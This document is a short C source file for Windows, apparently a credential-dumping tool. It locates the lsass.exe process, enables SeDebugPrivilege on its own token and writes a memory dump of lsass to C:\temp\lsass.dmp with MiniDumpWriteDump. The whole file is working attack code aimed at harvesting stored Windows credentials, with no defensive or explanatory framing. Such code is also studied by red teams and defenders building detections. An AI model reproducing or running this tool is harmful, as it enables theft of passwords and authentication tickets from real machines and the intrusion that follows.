#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <dbghelp.h>

#pragma comment (lib, "dbghelp.lib")


DWORD GetPID() {

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] Faield to take snapshot! Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Snapshot taken successfully!\n");

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &pe32) == TRUE) {
		while (Process32Next(hSnapshot, &pe32) == TRUE) {
			if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0) {
				DWORD PID = pe32.th32ProcessID;
				printf("[+] Found lsass.exe process!\n");
				return PID;
				break;
			}
		}
	}
	CloseHandle(hSnapshot);
}

BOOL GiveMePower(LPCWSTR Priv) {

	LUID luid;
	HANDLE hToken;

	LookupPrivilegeValue(NULL, Priv, &luid);

	TOKEN_PRIVILEGES tpriv = { 0 };
	tpriv.PrivilegeCount = 1;
	tpriv.Privileges[0].Luid = luid;
	tpriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("[!] Failed to get the process token of current process! Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got current process token.\n");

	if (!AdjustTokenPrivileges(hToken, FALSE, &tpriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[!] Failed to enable SeDebugPrivilege. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Gave Fullpower to the current process..!!!\n");
	printf("[+] Enabled SeDebugPrivilege!\n");
	
	return TRUE;
}

BOOL DumpThatDude() {

	DWORD PID = GetPID();

	HANDLE hProcess = OpenProcess((PROCESS_VM_READ | PROCESS_QUERY_INFORMATION), TRUE, PID);
	if (hProcess == NULL) {
		printf("[!] Failed to get an handle to lsass.exe! Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got an handle to lsass.exe\n");

	HANDLE hCreateFile = CreateFileA((LPCSTR)"C:\\temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hCreateFile == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to create temp file to store the dump. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Created the dump file at C:\\temp\\lsass.dmp\n");

	if (!MiniDumpWriteDump(hProcess, PID, hCreateFile, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL)) {
		return EXIT_FAILURE;
	}
	printf("[+] Dumped lsass.exe!\n");

}

int main() {

	DWORD PID = GetPID();
	printf("[+] PID of lsass.exe is %ld\n", PID);

	GiveMePower(SE_DEBUG_NAME);
	DumpThatDude();

	return EXIT_SUCCESS;

}